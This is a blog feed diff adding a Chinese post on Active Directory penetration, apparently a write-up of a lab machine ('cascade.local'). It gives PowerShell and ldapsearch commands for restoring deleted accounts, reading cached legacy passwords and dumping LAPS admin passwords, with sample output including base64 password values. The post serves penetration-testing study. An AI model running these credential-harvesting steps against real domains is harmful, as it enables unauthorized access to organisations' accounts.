@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://github.com/"/>
-  <updated>2020-04-25T16:32:53.954Z</updated>
+  <updated>2020-04-26T01:33:22.615Z</updated>
   <id>https://github.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>域渗透之AD Recyle Bin组利用+Ldaps信息枚举</title>
+    <link href="https://github.com/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/"/>
+    <id>https://github.com/2020/04/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BAD-Recyle-Bin%E7%BB%84%E5%88%A9%E7%94%A8-Ldaps%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/</id>
+    <published>2020-04-26T01:14:42.000Z</published>
+    <updated>2020-04-26T01:33:22.615Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="AD-Recyle-Bin组利用："><a href="#AD-Recyle-Bin组利用：" class="headerlink" title="AD Recyle Bin组利用："></a>AD Recyle Bin组利用：</h2><p>使用回收站还原用户，或获取用户旧密码进行碰撞</p><p>前提,需要域内启用回收站功能，且用户在AD Recyle Bin 组中</p><p><strong>未启用启用回收站和启用回收站删除对象对比</strong></p><p>图1：启用回收站之前已删除的Active Directory对象的生命周期</p><p><img src="1.png" alt=""></p><p>图2：启用回收站后已删除的Active Directory对象的生命周期</p><p><img src="2.png" alt=""></p><p>启用AD回收站：</p><pre><code>Enable-ADOptionalFeature –Identity ‘CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=www,DC=domain,DC=com’ –Scope ForestOrConfigurationSet –Target ‘www.domain.com’</code></pre><p>查看删除用户</p><pre><code>Get-ADObject -filter &apos;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&apos; -includeDeletedObjects</code></pre><p>结果示例：</p><pre><code>Deleted           : TrueDistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=localName              : TempAdmin                DEL:f0cc344d-31e0-4866-bceb-a842791ca059ObjectClass       : userObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059</code></pre><p>尝试还原已删除账户</p><pre><code>Restore-ADObject -Identity &apos;f0cc344d-31e0-4866-bceb-a842791ca059&apos;###使用ObjectGUID进行还原</code></pre><p>或</p><pre><code>Get-ADObject -Filter {displayName -eq  &quot;TempAdmin&quot;} IncludeDeletedObjects | Restore-ADObject</code></pre><p>查询ms-mcs-admpwd</p><pre><code>Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN=*)&quot; –IncludeDeletedObjects -Property ms-mcs-admpwd  </code></pre><p>查看有关于特定账户的全部属性信息：</p><pre><code>Get-ADObject -Filter {displayName -eq &quot;TempAdmin&quot;} -IncludeDeletedObjects -Properties *  cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz</code></pre><p>如这里存在LegacyPassword（直接缓存的旧密码）名称被自定义，通过查看所有属性列出来</p><h2 id="Ldap枚举：获取基本的账户信息、密码"><a href="#Ldap枚举：获取基本的账户信息、密码" class="headerlink" title="Ldap枚举：获取基本的账户信息、密码"></a>Ldap枚举：获取基本的账户信息、密码</h2><p>ldapsearch 使用：<br>列出基本的上下文信息</p><pre><code>kali@kali:$ ldapsearch -h 10.10.10.182 -D  cascade.local -x -s base namingcontexts</code></pre><p>提取整个域目录的数据，然后grep筛选输出：</p><pre><code>kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -s sub -b &quot;DC=cascade,DC=local&quot; |tee ldap.outroot@kali:$ cat ldap.out |grep -i memberof</code></pre><p>筛选输出：</p><pre><code>kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascade,DC=local&quot; &apos;(objectClass=User)&apos; sAMAccountName sAMAccountType</code></pre><p>列出管理用户组</p><pre><code>kali@kali:$ ldapsearch -h 10.10.10.182 -D cascade.local -x -b &quot;DC=cascae,DC=local&quot; &apos;(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local)&apos; |grep -i memberof</code></pre><p>Dump LAPS passwords:</p><pre><code>kali@kali:$ ldapsearch -h  -D cascade.local -x -b &quot;dc=cascade,dc=local&quot; &apos;(ms-MCS-AdmPwd=*)&apos; ms-MCS-AdmPwd</code></pre><p>同样windapsearch也是一个不错的工具</p><pre><code>kali@kali:$./windapsearch_py2.py  --dc-ip 10.10.10.182 -d cascade.local --full --users...user:r.thompsoncascadeLegacyPwd: clk0bjVldmE=...</code></pre><p><a href="https://github.com/snovvcrash/cheatsheets/tree/master">https://github.com/snovvcrash/cheatsheets/tree/master</a> </p><p><a href="https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html" target="_blank" rel="noopener">https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html</a> </p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;AD-Recyle-Bin组利用：&quot;&gt;&lt;a href=&quot;#AD-Recyle-Bin组利用：&quot; class=&quot;headerlink&quot; title=&quot;AD Recyle Bin组利用：&quot;&gt;&lt;/a&gt;AD Recyle Bin组利用：&lt;/h2&gt;&lt;p&gt;使用回收站还原用户，
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>域控提权之Exchange提权</title>
